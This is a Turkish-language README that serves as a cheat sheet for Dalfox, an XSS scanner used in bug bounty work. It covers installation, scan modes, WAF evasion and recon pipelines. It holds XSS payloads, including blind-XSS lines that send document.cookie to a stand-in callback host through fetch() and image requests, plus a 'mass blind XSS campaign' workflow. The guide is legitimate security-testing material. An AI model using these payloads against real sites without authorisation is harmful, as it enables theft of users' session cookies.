[🇬🇧 English](../../README.md)

# 🦊 Dalfox - XSS Tarama ve Analiz Çatısı

```
  ██████╗  █████╗ ██╗     ███████╗ ██████╗ ██╗  ██╗
  ██╔══██╗██╔══██╗██║     ██╔════╝██╔═══██╗╚██╗██╔╝
  ██║  ██║███████║██║     █████╗  ██║   ██║ ╚███╔╝ 
  ██║  ██║██╔══██║██║     ██╔══╝  ██║   ██║ ██╔██╗ 
  ██████╔╝██║  ██║███████╗██║     ╚██████╔╝██╔╝ ██╗
  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝
         Powerful XSS Scanner & Analysis Tool
```

<p align="center">
  <img src="https://img.shields.io/badge/Dalfox-XSS_Scanner-blue?style=for-the-badge" alt="Dalfox">
  <img src="https://img.shields.io/badge/Reflected_XSS-green?style=for-the-badge" alt="Reflected">
  <img src="https://img.shields.io/badge/Bug_Bounty-red?style=for-the-badge" alt="Bug Bounty">
</p>

---

## 📋 İçindekiler

- [Dalfox Nedir?](#-dalfox-nedir)
- [Kurulum](#-kurulum)
- [Temel Kullanım](#-temel-kullanım)
- [Tarama Modları](#-tarama-modları)
- [Gelişmiş Seçenekler](#-gelişmiş-seçenekler)
- [Kör XSS (Blind XSS)](#-kör-xss-blind-xss)
- [Hızlı Başvuru](#-hızlı-başvuru)
- [Bug Bounty İş Akışları](#-bug-bounty-iş-akışları)
- [XSS Avcılığı İpuçları](#-xss-avcılığı-ipuçları)
- [Kaynaklar](#-kaynaklar)

---

## 🎯 Dalfox Nedir?

**Dalfox**, web uygulamalarındaki Siteler Arası Betik Çalıştırma (XSS) açıklarını tespit eden güçlü, hızlı ve analitik bir tarama aracıdır:

- 🔍 **Parametre Analizi** - Yanıttaki yansıma (reflection) noktalarını akıllıca belirler
- 🎯 **XSS Tespiti** - Yansıyan (Reflected) ve DOM tabanlı XSS açıklarını yakalar
- 💉 **Kör XSS (Blind XSS)** - Bant dışı (Out-of-band / OOB) etkileşim testlerini destekler
- ⚡ **Hızlı ve Eşzamanlı** - Go diliyle yazılmış, yüksek iş parçacığı kapasitesi

### Neden Dalfox?

| Özellik | Avantaj |
|---------|---------|
| Akıllı Analiz | Bağlama duyarlı (context-aware) payload optimizasyonu |
| WAF Atlama | Yaygın WAF filtrelerini aşma yetenekleri |
| Kör XSS | OOB etkileşim ve geri arama (callback) desteği |
| Madencilik Modu | JS dosyalarından gizli parametreleri çıkarma |

---

## 🚀 Kurulum

```bash
# Go ile kurulum (önerilen)
go install github.com/hahwul/dalfox/v2@latest

# Homebrew (macOS)
brew install dalfox

# Snap (Linux)
sudo snap install dalfox

# Doğrulama
dalfox version
```

---

## 📖 Temel Kullanım

### Tek URL

```bash
# Temel tarama
dalfox url https://example.com/search?q=test

# Çıktıyı dosyaya kaydetme
dalfox url https://example.com/search?q=test -o results.txt
```

### Çoklu URL

```bash
# Standart girdiden (stdin) okuma
cat urls.txt | dalfox pipe

# Dosyadan okuma
dalfox file urls.txt

# Paralel işçi (worker) sayısı belirterek
cat urls.txt | dalfox pipe -w 50
```

### Sessiz Mod

```bash
# Yalnızca bulunan zafiyetleri göster
dalfox url https://example.com/search?q=test --silence

# Renksiz çıktı
dalfox url https://example.com/search?q=test --no-color
```

---

## 🔎 Tarama Modları

### URL Modu

```bash
# Tekil URL taraması
dalfox url https://example.com/page?param=value

# POST verisi ile tarama
dalfox url https://example.com/page?param=value -d "post_param=value"
```

### Pipe (Boru Hattı) Modu

```bash
# Standart girdiden tek URL
echo "https://example.com/search?q=test" | dalfox pipe

# Parametre içeren URL listesini tarama
cat urls_with_params.txt | dalfox pipe
```

### Dosya Modu

```bash
# Dosyadan liste tarama
dalfox file urls.txt

# Çıktıyı dosyaya yönlendirerek
dalfox file urls.txt -o results.txt
```

### Sunucu (API) Modu

```bash
# API sunucusunu başlatma
dalfox server

# Özel port belirleme
dalfox server -p 8080

# İstek gönderme:
# POST http://localhost:8090/scan
# {"url": "https://example.com/search?q=test"}
```

---

## ⚙️ Gelişmiş Seçenekler

### Özel HTTP Başlıkları (Headers)

```bash
# Başlık ekleme
dalfox url https://example.com/search?q=test -H "Authorization: Bearer token"

# Birden fazla başlık ekleme
dalfox url https://example.com/search?q=test \
  -H "Cookie: session=abc" \
  -H "X-Forwarded-For: 127.0.0.1"
```

### Çerez ve Kimlik Doğrulama

```bash
# Oturum çerezi ile
dalfox url https://example.com/search?q=test -C "session=abc123"

# Temel kimlik doğrulama (Basic auth)
dalfox url https://example.com/search?q=test --basic-auth "user:pass"
```

### Özel Payload'lar

```bash
# Özel payload dosyasından okuma
dalfox url https://example.com/search?q=test --custom-payload payloads.txt

# Tekil özel payload belirtme
dalfox url https://example.com/search?q=test -p '<script>alert(1)</script>'

# Dosyadaki payload formatı:
# <script>alert(1)</script>
# <img src=x onerror=alert(1)>
# <svg onload=alert(1)>
```

### Çıktı Formatları

```bash
# JSON formatında çıktı
dalfox url https://example.com/search?q=test --format json -o result.json

# Yalnızca çalışan PoC'leri göster
dalfox url https://example.com/search?q=test --only-poc
```

### Performans Ayarları

```bash
# Eşzamanlı iş parçacığı sayısı (worker)
dalfox url https://example.com/search?q=test -w 100

# Zaman aşımı süresi (saniye)
dalfox url https://example.com/search?q=test --timeout 10

# İstekler arası gecikme (milisaniye)
dalfox url https://example.com/search?q=test --delay 100
```

### WAF Atlama (Evasion)

```bash
# WAF atlatma modunu etkinleştirme
dalfox url https://example.com/search?q=test --waf-evasion

# Parmak izi madenciliğini atlama
dalfox url https://example.com/search?q=test --skip-mining
```

### Proxy Kullanımı

```bash
# HTTP proxy
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080

# Burp Suite üzerinden geçirme
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080
```

---

## 💉 Kör XSS (Blind XSS)

### Blind XSS Payload Kullanımı

```bash
# XSS Hunter veya Burp Collaborator adresi ile
dalfox url https://example.com/form?input=test -b "https://your.xss.ht"

# -b parametresi otomatik olarak kör XSS geri arama payload'larını ekler
```

### Özel Kör XSS Payload Dosyası

```bash
# Özel dosya ile kör XSS
dalfox url https://example.com/form?name=test \
  --blind "https://your.xss.ht" \
  --custom-payload blind_payloads.txt
```

### Örnek Kör XSS Payload'ları

```html
"><img src=x onerror="fetch('https://your.xss.ht/'+document.cookie)">
"><script src="https://your.xss.ht"></script>
'"><script>new Image().src="https://your.xss.ht/?c="+document.cookie</script>
```

---

## 📊 Hızlı Başvuru

### Temel Komutlar

| Komut | Açıklama |
|-------|----------|
| `dalfox url URL` | Tekil URL'yi tarar |
| `dalfox file file.txt` | Dosyadan URL listesini tarar |
| `cat urls \| dalfox pipe` | Standart girdiden tarar |
| `dalfox server` | API sunucusunu başlatır |

### Temel Parametreler

| Parametre | Açıklama |
|-----------|----------|
| `-o file.txt` | Çıktı dosyası |
| `-w 50` | Eşzamanlı işçi sayısı |
| `-H "Header: value"` | Özel HTTP başlığı |
| `-C "cookie=value"` | Oturum çerezi |
| `-b "url"` | Kör XSS geri arama adresi |
| `--proxy URL` | HTTP proxy adresi |
| `--timeout 10` | İstek zaman aşımı süresi |

### Çıktı Parametreleri

| Parametre | Açıklama |
|-----------|----------|
| `--format json` | JSON formatında çıktı |
| `--only-poc` | Yalnızca çalışan PoC'leri listele |
| `--silence` | Sessiz mod |
| `--no-color` | Renksiz çıktı |

### Payload Parametreleri

| Parametre | Açıklama |
|-----------|----------|
| `-p "payload"` | Tekil özel payload |
| `--custom-payload file` | Özel payload dosyası |
| `--waf-evasion` | WAF atlatma modunu aç |

---

## 🎯 Bug Bounty İş Akışları

### Hızlı XSS Taraması

```bash
# Hızlı tarama
dalfox url "https://target.com/search?q=test" --silence
```

### URL Toplama Araçları ile Birlikte Kullanım

```bash
# GAU + Dalfox
gau target.com | grep "=" | dalfox pipe -o xss_results.txt

# Wayback + Dalfox
echo target.com | waybackurls | grep "=" | dalfox pipe --silence
```

### Toplu Tarama

```bash
# Parametre içeren tüm URL'leri tarama
cat all_urls.txt | grep "?" | dalfox pipe -w 100 -o found_xss.txt
```

### GF Kalıpları ile Filtreleme

```bash
# GF + Dalfox entegrasyonu
gau target.com | gf xss | dalfox pipe --silence

# httpx ile canlı olanları süzerek
gau target.com | gf xss | httpx -silent | dalfox pipe
```

### Kimlik Doğrulamalı Tarama

```bash
# Oturum çerezi ile tarama
dalfox url "https://target.com/dashboard?search=test" \
  -C "session=abc123" \
  -H "Authorization: Bearer token" \
  -o auth_xss.txt
```

### Kapsamlı Keşif Zinciri

```bash
# Eksiksiz XSS avcılığı boru hattı
subfinder -d target.com -silent | \
  httpx -silent | \
  gau | \
  gf xss | \
  uro | \
  dalfox pipe -w 50 --silence -o xss_vulnerabilities.txt
```

### Kitlesel Kör XSS Kampanyası

```bash
# İletişim formları üzerinde toplu kör XSS
cat contact_forms.txt | dalfox pipe -b "https://your.xss.ht" --silence

# Girdi formlarına özel tarama
cat form_urls.txt | dalfox pipe \
  -b "https://your.xss.ht" \
  --custom-payload blind_xss.txt \
  -w 10
```

---

## 💡 XSS Avcılığı İpuçları

1. **Tüm parametreleri inceleyin** - Yalnızca arama kutularına odaklanmayın
2. **Farklı bağlamları (contexts) test edin** - HTML içi, JS bloğu, HTML özniteliği (attribute)
3. **Kör XSS tekniklerinden yararlanın** - Yönetim panelleri ve sistem logları için idealdir
4. **Açık yönlendirme ile zincirleyin** - Etkiyi ve ödül miktarını artırın
5. **Yanıt başlıklarını denetleyin** - CSP (İçerik Güvenliği Politikası) ve filtreleri kontrol edin
6. **POST parametrelerini atlamayın** - Çoğu avcının gözden kaçırdığı alanlardır

### Yaygın XSS Enjeksiyon Noktaları

```
- Arama kutuları
- Kullanıcı profil alanları (ad, biyografi, unvan vb.)
- Yorum ve geri bildirim formları
- URL parametreleri
- HTTP başlıkları (Referer, User-Agent)
- Dosya yükleme isimleri (filename)
- Hata ve uyarı mesajları
```

### Bağlama Özel (Context-Specific) Payload'lar

| Bağlam (Context) | Payload |
|-------------------|---------|
| HTML Gövdesi | `<script>alert(1)</script>` |
| Öznitelik (Attribute) | `" onmouseover="alert(1)"` |
| JavaScript Bloğu | `';alert(1)//` |
| URL Şeması | `javascript:alert(1)` |

---

## 📚 Kaynaklar

- [Dalfox GitHub Deposu](https://github.com/hahwul/dalfox)
- [XSS Payload Listesi](https://github.com/payloadbox/xss-payload-list)

### İlgili Başvuru Kılavuzları
- [Bug Bounty Metodolojisi](../../Bug-Bounty-Methodology/translations/README.tr.md)
- [XSS Payload Koleksiyonu](../../Payloads/translations/XSS.tr.md)
- [Burp Suite](../../Burp-Suite/translations/README.tr.md)

---

<p align="center">
  <b>🦊 XSS Zafiyetlerini Keşfedin!</b><br>
  <i>Dalfox - XSS Avcısının En Sadık Dostu</i>
</p>
